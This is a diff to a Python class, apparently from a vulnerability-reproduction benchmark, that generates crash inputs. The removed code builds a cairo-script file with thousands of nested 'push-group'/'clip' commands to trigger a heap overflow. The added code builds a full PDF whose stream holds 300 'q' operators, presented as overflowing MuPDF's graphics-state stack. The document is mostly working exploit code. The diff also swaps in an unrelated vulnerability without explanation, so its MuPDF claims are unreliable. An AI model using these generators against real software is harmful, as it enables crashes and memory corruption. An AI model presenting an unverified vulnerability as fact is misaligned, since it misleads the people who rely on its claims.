@@ -1,26 +1,15 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability oss-fuzz:42537168.
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability is a heap buffer overflow in the cairo-script interpreter,
-        caused by an insufficient check on the nesting depth of groups ('push-group')
-        and clips ('clip'). The fix introduced a hard limit of 128 for the nesting
-        depth.
+        The vulnerability is a heap buffer overflow in MuPDF's graphics state stack,
+        triggered by an excessive number of 'q' (save graphics state) operations
+        in a PDF content stream. The default stack limit is 256. Pushing more
+        than 256 states without popping them causes an out-of-bounds write.
 
-        The vulnerability can be triggered by creating a script that exceeds this
-        nesting depth. The ground-truth PoC is very large (~913KB) and consists
-        of a long, repeating sequence of "push-group" and "clip" commands.
-        This suggests that while the overflow happens after ~128 levels, a
-        crash might only occur reliably after significant heap manipulation
-        (a form of heap spraying) caused by repeating the operation many
-        thousands of times.
-
-        This solution generates a PoC with a similar structure to the ground-truth
-        one, but with fewer repetitions to create a much smaller file, aiming for
-        a better score. A few thousand repetitions should be sufficient to
-        trigger the crash reliably, as opposed to the ~57,000 in the
-        ground-truth PoC.
+        This PoC constructs a minimal, valid PDF containing a content stream
+        with 300 'q' operations, which is sufficient to trigger the overflow.
 
         Args:
             src_path: Path to the vulnerable source code tarball (unused).
@@ -28,22 +17,67 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability.
         """
+        # The payload consists of 300 'q' operators to overflow the graphics state stack.
+        payload = b'q ' * 300
+        
+        # We build a valid PDF structure from scratch to deliver the payload.
+        # This involves creating the necessary PDF objects (Catalog, Pages, Page, Stream)
+        # and correctly formatting the cross-reference (xref) table and trailer.
+        parts = []
+        offsets = {}
+        current_offset = 0
 
-        # Header for a cairo-script file.
-        header = b"~!cairo-script\n"
+        # PDF Header
+        header = b"%PDF-1.7\n"
+        parts.append(header)
+        current_offset += len(header)
         
-        # A simple setup command, as seen in the original PoC.
-        setup = b"0 0 0 set-source-rgb\n"
+        # Object 1: Catalog
+        offsets[1] = current_offset
+        obj1 = b"1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n"
+        parts.append(obj1)
+        current_offset += len(obj1)
         
-        # The number of repetitions must be > 128 to cross the vulnerability
-        # threshold. We choose 4096, a number large enough to be robust
-        # by manipulating the heap state, but significantly smaller than the
-        # ground truth PoC's implied repetitions for a high score.
-        repetitions = 4096
+        # Object 2: Pages
+        offsets[2] = current_offset
+        obj2 = b"2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1>>\nendobj\n"
+        parts.append(obj2)
+        current_offset += len(obj2)
         
-        # The payload block from the original PoC that increases nesting depth.
-        payload_block = b"push-group\nclip\n"
+        # Object 3: Page
+        offsets[3] = current_offset
+        obj3 = b"3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R>>\nendobj\n"
+        parts.append(obj3)
+        current_offset += len(obj3)
         
-        payload = payload_block * repetitions
+        # Object 4: Content Stream with payload
+        offsets[4] = current_offset
+        stream_header = b"<</Length %d>>" % len(payload)
+        obj4 = stream_header + b"\nstream\n" + payload + b"\nendstream\nendobj\n"
+        parts.append(obj4)
+        current_offset += len(obj4)
         
-        return header + setup + payload
+        # Cross-Reference (XRef) Table
+        xref_start_offset = current_offset
+        
+        xref_table = b"xref\n0 5\n"
+        xref_table += b"0000000000 65535 f \n"
+        xref_table += b"%010d 00000 n \n" % offsets[1]
+        xref_table += b"%010d 00000 n \n" % offsets[2]
+        xref_table += b"%010d 00000 n \n" % offsets[3]
+        xref_table += b"%010d 00000 n \n" % offsets[4]
+        parts.append(xref_table)
+        
+        # Trailer
+        trailer = b"trailer\n<</Size 5 /Root 1 0 R>>\n"
+        parts.append(trailer)
+        
+        # Startxref
+        startxref = b"startxref\n%d\n" % xref_start_offset
+        parts.append(startxref)
+        
+        # End-of-File marker
+        eof = b"%%EOF"
+        parts.append(eof)
+        
+        return b"".join(parts)
